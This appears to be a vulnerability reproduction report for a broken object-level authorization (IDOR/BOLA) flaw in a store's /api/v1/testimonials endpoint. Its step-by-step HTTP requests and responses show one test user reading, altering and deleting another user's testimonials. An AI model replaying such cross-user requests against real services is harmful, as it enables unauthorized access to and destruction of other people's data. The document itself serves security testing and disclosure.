# IDOR/BOLA Reproduction Evidence - /api/v1/testimonials/{id}

## Target
https://duck-store.escape.tech/api/v1/testimonials/{id}

## Test Users
- **User A (victim)**: testuserA (ID: d8083077-d088-4bfe-b147-0ad561de59c2)
- **User B (attacker)**: testuserB (ID: 525a9d6a-3532-4df6-b164-340aa300be97)

## Step 1: User A creates a testimonial (ID 9)
**Request:**
```
POST /api/v1/testimonials/
Authorization: Bearer <user_a_token>
Content-Type: application/json
{"content": "Testimonial from user_a", "rating": 5}
```

**Response (201 Created):**
```json
{"id":9,"user_id":"d8083077-d088-4bfe-b147-0ad561de59c2","user":{"id":"d8083077-d088-4bfe-b147-0ad561de59c2","username":"testuserA"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"Testimonial from user_a","rating":5,"is_featured":false,"created_at":"2026-09-29T10:27:44.349112","name":"testuserA","role":"Duck Lover","avatar_url":null}
```

## Step 2: User B READS User A's testimonial (ID 9) - CROSS-USER READ
**Request:**
```
GET /api/v1/testimonials/9
Authorization: Bearer <user_b_token>
```

**Response (200 OK):**
```json
{"id":9,"user_id":"d8083077-d088-4bfe-b147-0ad561de59c2","user":{"id":"d8083077-d088-4bfe-b147-0ad561de59c2","username":"testuserA"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"Testimonial from user_a","rating":5,"is_featured":false,"created_at":"2026-09-29T10:27:44.349112","name":"testuserA","role":"Duck Lover","avatar_url":null}
```
**✅ PROOF: User B can read User A's testimonial**

## Step 3: User B MODIFIES User A's testimonial (ID 9) - CROSS-USER WRITE (PUT)
**Request:**
```
PUT /api/v1/testimonials/9
Authorization: Bearer <user_b_token>
Content-Type: application/json
{"content": "Modified by user_b - IDOR exploit", "rating": 1}
```

**Response (200 OK):**
```json
{"id":9,"user_id":"d8083077-d088-4bfe-b147-0ad561de59c2","user":{"id":"d8083077-d088-4bfe-b147-0ad561de59c2","username":"testuserA"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"Modified by user_b - IDOR exploit","rating":1,"is_featured":false,"created_at":"2026-09-29T10:27:44.349112","name":"testuserA","role":"Duck Lover","avatar_url":null}
```
**✅ PROOF: User B can modify User A's testimonial**

## Step 4: User A creates another testimonial (ID 10)
**Request:**
```
POST /api/v1/testimonials/
Authorization: Bearer <user_a_token>
Content-Type: application/json
{"content": "Testimonial for deletion test", "rating": 3}
```

**Response (201 Created):**
```json
{"id":10,"user_id":"d8083077-d088-4bfe-b147-0ad561de59c2","user":{"id":"d8083077-d088-4bfe-b147-0ad561de59c2","username":"testuserA"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"Testimonial for deletion test","rating":3,"is_featured":false,"created_at":"2026-09-29T10:28:28.397714","name":"testuserA","role":"Duck Lover","avatar_url":null}
```

## Step 5: User B DELETES User A's testimonial (ID 10) - CROSS-USER DELETE
**Request:**
```
DELETE /api/v1/testimonials/10
Authorization: Bearer <user_b_token>
```

**Response (204 No Content):**
```
< HTTP/2 204
```
**✅ PROOF: User B can delete User A's testimonial**

## Step 6: User A confirms testimonial 10 is deleted
**Request:**
```
GET /api/v1/testimonials/10
Authorization: Bearer <user_a_token>
```

**Response (404 Not Found):**
```json
{"detail":"Testimonial not found"}
```
**✅ CONFIRMED: The testimonial was permanently deleted by User B**

## Summary
All three operations (READ, MODIFY, DELETE) succeed cross-user without authorization checks. The API does not verify that the authenticated user owns the testimonial before allowing access. This is a classic Broken Object Level Authorization (BOLA/IDOR) vulnerability.